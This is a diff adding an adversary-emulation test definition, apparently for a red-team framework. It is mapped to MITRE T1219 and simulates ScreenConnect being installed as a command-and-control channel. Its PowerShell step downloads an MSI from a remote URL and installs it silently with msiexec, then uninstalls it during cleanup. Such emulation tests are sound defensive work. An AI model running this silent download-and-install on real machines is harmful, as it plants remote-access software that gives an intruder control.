@@ -1,0 +1,26 @@
+api_version: "2.0"
+name: ScreenConnect Application Download and Install on Windows
+description: |
+    An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.
+    Msiexec will be used to quietly insall ScreenConnect.
+uuid: 4a18cc4e-416f-4966-9a9d-75731c4684c0
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1219: Remote Access Software'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: screenconnect-application-download-and-install-on-windows
+      inline: |
+        $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+        Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"
+        msiexec /i $installer /qn
+      executor: powershell
+      cleanup:
+        inline: |
+            $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
+            msiexec /x $installer /qn
+        executor: powershell
